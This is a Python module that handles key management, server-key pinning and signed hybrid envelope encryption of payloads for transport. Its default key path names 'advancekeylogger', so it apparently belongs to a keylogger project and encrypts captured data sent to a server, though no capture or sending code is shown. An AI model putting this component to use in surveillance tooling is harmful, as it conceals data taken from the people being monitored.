"""
E2E protocol orchestrating key management and envelope encryption.
"""
from __future__ import annotations

import base64
from pathlib import Path
from typing import Any

from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import x25519

from crypto.envelope import HybridEnvelope
from crypto.key_store import KeyStore
from crypto.keypair import AgentKeyPair, KeyPairManager


class E2EProtocol:
    """Prepare encrypted envelopes for transport."""

    def __init__(self, config: dict[str, Any]) -> None:
        self._config = config
        key_store_path = config.get("key_store_path", "~/.advancekeylogger/keys/")
        self._store = KeyStore(str(Path(key_store_path).expanduser()))
        self._keys = KeyPairManager(self._store).load_or_create()
        self._server_public_key = self._load_server_public_key()
        self._envelope = HybridEnvelope(self._server_public_key)

    def encrypt(self, payload: bytes) -> bytes:
        envelope = self._envelope.encrypt(
            payload,
            sender_signing_key=self._keys.signing_private,
            sender_public_key=self._keys.signing_public,
        )
        return envelope.to_bytes()

    def _load_server_public_key(self) -> x25519.X25519PublicKey:
        key_b64 = str(self._config.get("server_public_key", "")).strip()
        if not key_b64:
            raise ValueError("encryption.e2e.server_public_key is required for E2E mode")
        raw = base64.b64decode(key_b64.encode("utf-8"))
        self._pin_server_key(raw)
        return x25519.X25519PublicKey.from_public_bytes(raw)

    def _pin_server_key(self, raw: bytes) -> None:
        if not bool(self._config.get("pin_server_key", True)):
            return
        pinned = self._store.load_bytes("server_public_key")
        if pinned and pinned != raw:
            raise ValueError("Pinned server key does not match configured key")
        if not pinned:
            self._store.save_bytes("server_public_key", raw)

    def export_sender_public_key(self) -> str:
        public_bytes = self._keys.signing_public.public_bytes(
            encoding=serialization.Encoding.Raw,
            format=serialization.PublicFormat.Raw,
        )
        return base64.b64encode(public_bytes).decode("utf-8")

    def export_exchange_public_key(self) -> str:
        public_bytes = self._keys.exchange_public.public_bytes(
            encoding=serialization.Encoding.Raw,
            format=serialization.PublicFormat.Raw,
        )
        return base64.b64encode(public_bytes).decode("utf-8")
